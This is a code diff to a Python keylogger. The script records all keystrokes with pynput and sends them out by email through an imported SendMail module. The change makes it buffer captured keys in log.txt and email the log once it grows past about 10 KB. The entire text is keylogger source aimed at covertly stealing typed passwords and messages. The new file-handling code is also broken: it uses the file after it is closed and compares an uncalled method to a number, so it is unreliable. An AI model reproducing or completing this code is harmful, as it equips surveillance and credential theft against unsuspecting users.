@@ -1,6 +1,7 @@
 import pynput
 from pynput.keyboard import Key,Listener
 import SendMail
+import os
 
 
 count = 0
@@ -12,7 +13,7 @@ def on_press(key):
     count += 1
     if count > 10 :
         count = 0
-        email(keys)
+        write_file(keys)
 
 def email(keys):
     message = ""
@@ -31,6 +32,13 @@ def email(keys):
 def on_release(key):
     if key == Key.esc:
         return False
+def write_file(keys):
+    with open("log.txt","a") as f:
+        for key in keys:
+            f.write(key)
+    f.seek(0, os.SEEK_END)
+    if f.tell>10240:
+        email(f)
 
 with Listener(on_press = on_press, on_release = on_release) as listener:
     listener.join()
